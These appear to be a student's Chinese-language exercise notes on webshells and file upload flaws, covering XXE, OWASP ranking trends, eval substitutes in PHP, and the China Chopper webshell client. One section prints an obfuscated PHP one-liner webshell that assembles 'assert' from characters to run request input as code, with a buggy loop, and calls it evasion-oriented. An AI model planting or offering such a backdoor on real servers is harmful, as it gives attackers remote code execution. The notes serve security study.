# **Webshell与文件上传漏洞**
## 1.请思考：XXE漏洞的原理的是什么？有哪些危害？
>XML外部实体注入(XML External Entity)。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。

更多内容参见腾讯安全应急响应中心的 **[这篇文章](https://security.tencent.com/index.php/blog/msg/69) ** 及   **[这份文件](http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf)**

## 2.寻找OWASP 近年漏洞的排名变化，思考未来哪些方面会成为Web应用主要安全威胁？
纵观2013-2017的排名，注入（Injection
）稳居榜首。普遍性：几乎任何数据源都能成为注入载体，包括环境变量、所有类型的用户、参数、外部和内部Web服务。危害性：注入能导致数据丢失、破坏或泄露，其重要性不可忽视。同时，XXE作为后起之秀能够直接冲到Top排行榜的第4，值得思考（似乎连微信支付都沦陷了）。

## 3.请思考：都有哪些PHP函数可以替代eval？
 错误姿势：
```
 <?php

 	/*
 	据说免杀的一句话
 	assert($string)
 	*/

 	  $arr = array('a','s','s','e','r','t');

 	  $func = '';

   	  for($i=0;$i<count($arr);$i++) {

   	    $func .= $func . $arr[$i];

   	  }

 	  $func($_REQUEST['c']);

 ?>
```
正确姿势：具体情况具体分析,例如代码

`eval("echo'hello world';");`

上边代码等同于下边的代码：

`echo"hello world";`

在浏览器中都输出：hello world（手动滑稽）
## 4.请使用中国菜刀对网站数据库进行管理操作。
![caidao](http://wx1.sinaimg.cn/mw690/c4428b0bgy1g0x5wd4xd3j211y0lc7d3.jpg)
